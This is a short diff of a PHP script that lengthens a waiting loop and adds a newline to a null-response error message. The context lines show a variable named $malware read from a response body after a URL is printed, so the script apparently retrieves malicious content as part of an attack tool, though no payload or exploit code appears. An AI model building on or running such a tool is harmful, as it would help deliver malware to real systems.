@@ -197,7 +197,7 @@ for($i=0; $i<count($code); $i++)
 echo '[+] ' . $url . PHP_EOL;
 
 echo '[+] Waiting';
-for($i=0; $i<3; $i++)
+for($i=0; $i<10; $i++)
 {
     echo '.';
     sleep(1);
@@ -209,7 +209,7 @@ $malware = $malware['body'];
 
 if($malware == null)
 {
-    echo '[!] NULL Response...';
+    echo '[!] NULL Response...' . PHP_EOL;
     exit(-1);
 }
 
